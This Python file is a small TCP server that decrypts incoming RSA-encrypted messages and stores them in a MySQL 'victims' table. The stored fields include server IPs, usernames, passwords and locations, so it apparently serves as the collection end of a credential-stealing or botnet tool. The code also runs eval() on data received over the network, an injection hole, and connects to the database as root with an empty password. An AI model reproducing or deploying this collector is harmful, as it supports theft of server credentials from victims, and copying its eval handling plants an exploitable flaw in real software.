import socketserver
import mysql.connector
from termcolor import colored
import os
import rsa

class Server(socketserver.BaseRequestHandler):

    def insert_into_database(self, data):

        host = "127.0.0.1"
        username = "root"
        password = ""
        database = "xen"

        connection = mysql.connector.connect(host=host, user=username, password=password, database=database)
        cursor = connection.cursor()
        cursor.execute("INSERT INTO victims (server_id, server_name, server_os, server_ip, server_username, server_password, server_location, server_city, server_status) VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)", (data[0], data[1], data[2], data[3], data[4], data[5], data[6], data[7], data[8]))
        connection.commit()

        print(colored("[SERVER]", "green"), colored(">>", "yellow"), data, "dumped into the database")
        connection.close()

    def _decrypt_dummy_victim_data(self, data):

        current_path = os.path.dirname(os.path.realpath(__file__))
        private_key_location = os.path.join(current_path + '/verification', "privatekey.pem")

        with open(private_key_location, "rb") as key_file:
            private_key = rsa.PrivateKey.load_pkcs1(key_file.read())
            decrypted = rsa.decrypt(data, private_key).decode('ascii')
            return decrypted

    def handle(self):
        self.data = self.request.recv(4096)
        decrypted = self._decrypt_dummy_victim_data(self.data)
        decrypted = eval(decrypted)

        print(colored("[SERVER]", "green"), colored(">>", "yellow"), "Processing ->", decrypted, "from ->", self.client_address[0])
        self.insert_into_database(decrypted)


if __name__ == "__main__":
    with socketserver.TCPServer(("127.0.0.1", 6666), Server) as server:
        print(colored("[SERVER]", "green"), colored(">>", "yellow"), "Server has started")
        server.serve_forever()
